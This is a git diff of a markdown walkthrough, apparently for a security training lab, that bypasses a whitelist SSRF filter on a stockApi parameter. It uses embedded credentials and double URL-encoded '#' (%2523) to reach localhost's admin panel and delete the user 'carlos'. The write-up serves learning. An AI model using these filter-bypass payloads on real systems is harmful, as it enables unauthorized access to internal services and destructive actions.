@@ -106,16 +106,15 @@ While my intruder attack was running, I received a callback on the burp collabor
 #### 1. **Initial Attempt – Direct Access Blocked**
 
 - I intercepted the **Check Stock** request and replaced the `stockApi` parameter value with:
-```
 
+```
 http://localhost/admin
-
 ```
+
 - The server responded with:
+
 ```
-
 External stock check must be stock.weliketoshop.net
-
 ```
 
 
@@ -132,7 +131,6 @@ External stock check must be stock.weliketoshop.net
 - I tried accessing:
 ```
  http://stock.weliketoshop.net/admin
-
 ```
 
 ![image](https://github.com/user-attachments/assets/37b68c88-aa13-4a3d-b0fb-d443c76b9f78)
@@ -147,9 +145,7 @@ External stock check must be stock.weliketoshop.net
 
 - I tested:
 ```
-
 http://admin@stock.weliketoshop.net/
-
 ```
 
 ![image](https://github.com/user-attachments/assets/e3f29e10-10dd-4722-8bbb-eb6fa884fef7)
@@ -163,15 +159,11 @@ http://admin@stock.weliketoshop.net/
 
 - I tested:
 ```
-
 http://admin#@stock.weliketoshop.net/
-
 ```
 - The server responded with:
 ```
-
 External stock check host must be stock.weliketoshop.net
-
 ```
 
 ![image](https://github.com/user-attachments/assets/f22b8c4b-b5de-474d-abd1-b6be3b453c63)
@@ -182,19 +174,16 @@ External stock check host must be stock.weliketoshop.net
 
 - I encoded the `#` as `%23`:
 ```
-
 http://admin%23@stock.weliketoshop.net
-
 ```
+
 - Still failed — the filter likely decoded it once.
 
 ##### 3.4. **Double URL Encoding**
 
 - I double-encoded `#` as `%2523`:
 ```
-
 http://admin%2523@stock.weliketoshop.net
-
 ```
 
 ![image](https://github.com/user-attachments/assets/f02e65b7-ab4d-4b70-90cb-89e9287ad7e7)
@@ -207,9 +196,7 @@ http://admin%2523@stock.weliketoshop.net
 
 - Since `admin` wasn’t the goal, I replaced it with `localhost`:
 ```
-
 http://localhost%2523@stock.weliketoshop.net
-
 ```
 
 ![image](https://github.com/user-attachments/assets/9200e67f-c2ce-484e-91a6-c294bf494d1c)
@@ -222,18 +209,14 @@ http://localhost%2523@stock.weliketoshop.net
 
 - Appended `/admin` to the URL:
 ```
-
 http://localhost%2523@stock.weliketoshop.net/admin
-
 ```
 
 ![image](https://github.com/user-attachments/assets/c722989f-df57-495c-818e-ce18f52f14a6)
 
 - This revealed the deletion endpoint:
 ```
-
 /admin/delete?username=carlos
-
 ```
 
 ![image](https://github.com/user-attachments/assets/d69cb3ff-9bd8-4b54-9a9a-e605800ca9e4)
@@ -244,9 +227,7 @@ http://localhost%2523@stock.weliketoshop.net/admin
 
 - I submitted the final payload in the `stockApi` parameter:
 ```
-
 http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
-
 ```
 - This triggered the deletion of `carlos`.
 
@@ -258,4 +239,5 @@ http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
 
 
 ---
+
 
